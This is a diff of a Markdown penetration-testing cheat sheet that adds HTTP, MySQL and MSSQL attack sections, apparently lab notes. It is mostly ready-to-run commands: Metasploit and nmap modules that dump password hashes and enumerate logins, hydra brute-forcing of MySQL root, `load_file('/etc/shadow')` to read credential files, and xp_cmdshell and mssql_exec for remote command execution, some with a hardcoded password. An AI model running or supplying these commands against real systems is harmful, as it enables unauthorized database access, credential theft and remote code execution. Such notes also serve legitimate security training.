@@ -137,45 +137,83 @@ set STOP_ON_SUCCESS true
 set verbose true
 exploit
 ```
+## HTTP 
+```
+whatweb IPADDRESS
+http IPADDRESS
+dirb URLADDRESS
+browsh --startup-url URLADDRESS
+nmap --script http-enum -sV -p 80 IPADDRESS
+nmap --script http-headers -sV -p 80 IPADDERSS
+nmap --script http-webdav-scan --script-args http-methods.url-path=URLPATH IPADDRESS
+dirb URL /usr/share/metasploit-framework/data/wordlists/directory.txt
+```
+## HTTP Metasploit
+```
+use auxiliary/scanner/http/brute_dirs
+set RHOSTS IPADDRESS
+exploit
+
+use auxiliary/scanner/http/robots_txt
+set RHOSTS IPADDRESS
+run
+```
+
+## SQL 
+```
+
+```
+
 
 ## MySQL 
 ```
 mysql -h IPADDRESS -u root //connect to user account
 show databases; show databases
+use database;
+
+select load_file("/etc/shadow");
+
+nmap --script=mysql-empty-password -p 3306 IPADDRESS
+nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 IPADDRESS
+nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 IPADDRESS
+nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 IPADDRESS
+nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 IPADDRESS
+nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 IPADDRESS
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
+
+```
+## MYSQL Metasploit
+```
 msfconsole
 use auxiliary/scanner/mysql/mysql_schemadump
-set RHOSTS 192.71.145.3
+set RHOSTS IPADDRESS
 set USERNAME root
 set PASSWORD ""
 exploit
+
+msfconsole
 use auxiliary/scanner/mysql/mysql_writable_dirs
 set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
-set RHOSTS 192.71.145.3
+set RHOSTS IPADDRESS
 set VERBOSE false
 set PASSWORD ""
 exploit
+
+msfconsole
 use auxiliary/scanner/mysql/mysql_file_enum
-set RHOSTS 192.71.145.3
+set RHOSTS IPADDRESS
 set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
 set PASSWORD ""
 exploit
-mysql -h 192.71.145.3 -u root
-select load_file("/etc/shadow");
+
+msfconsole
 use auxiliary/scanner/mysql/mysql_hashdump
-set RHOSTS 192.71.145.3
+set RHOSTS IPADDRESS
 set USERNAME root
 set PASSWORD ""
 exploit
-nmap --script=mysql-empty-password -p 3306 192.71.145.3
-nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
-nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
-nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
- nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
-nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
-```
 
-
-```
 msfconsole
 use auxiliary/scanner/mysql/mysql_login
 set RHOSTS 192.149.194.3
@@ -185,6 +223,54 @@ set VERBOSE false
 set STOP_ON_SUCCESS true
 exploit
 
-hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.149.194.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+exploit
 
+```
+
+## MSSQL
+```
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt IPADDRESS
+nmap -p 1433 --script ms-sql-empty-password IPADDRESS
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" IPADDRESS -oN output.txt
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria IPADDRESS
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="command" 10.0.30.33
+
+```
+## MSSQL Metasploit
+```
+msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS IPADDRESS
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+set VERBOSE false
+exploit
+
+msfconsole
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS IPADDRESS
+exploit
+
+msfconsole
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS IPADDRESS
+exploit
+
+msfconsole
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS IPADDRESS
+set CMD whoami
+exploit
+
+msfconsole
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS IPADDRESS
+exploit
 ```
